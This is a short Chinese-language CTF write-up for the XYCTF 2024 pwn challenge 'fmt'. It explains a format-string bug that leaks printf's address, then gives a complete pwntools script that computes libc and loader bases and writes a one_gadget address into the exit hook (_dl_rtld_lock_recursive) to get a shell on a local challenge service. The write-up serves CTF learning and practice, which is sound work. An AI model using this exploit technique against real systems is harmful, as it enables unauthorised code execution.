# fmt

> 分类：Pwn

## 题目描述
格式化字符串漏洞。程序泄露 printf 地址，通过 exit_hook 改写到 one_gadget 拿 shell。

## 考察知识点
- 格式化字符串漏洞
- exit_hook（_dl_rtld_lock_recursive）
- one_gadget

## 解法
通过 exit_hook 改写到 one_gadget。

```python
from pwn import *
import os

os.chdir('./bin')
#sh = process('./vuln')
sh = remote('127.0.0.1',11030)
elf = ELF('./vuln')
libc = ELF('./libc-2.31.so')
ld = ELF('ld-2.31.so')

sh.recvuntil(b'Welcome to xyctf, this is a gift: ')

libc_base = sh.recvline()[:-1]
libc_base = eval(libc_base)
libc_base = libc_base - libc.symbols["printf"]
print('libc_base',hex(libc_base))
one_gadget = libc_base + 0xe3b2e
print('one_gadget',hex(one_gadget))
ld_base = libc_base+0x1f4000
print('ld_base',hex(ld_base))
_rtld_global = ld_base+ld.symbols["_rtld_global"]
_dl_rtld_lock_recursive = _rtld_global + 0xf08
print('_dl_rtld_lock_recursive',hex(_dl_rtld_lock_recursive))

input()
sh.send(b'%7$lld'.ljust(8,b'\x00')+p64(_dl_rtld_lock_recursive))
input()
sh.sendline(str(one_gadget).encode())

sh.interactive()
```

## 参考答案
（未给出，getshell 后读取）

## 来源
- 作者：jht3 | https://jht3qaq.github.io/2024/04/26/XYCTF2024-Writeup/
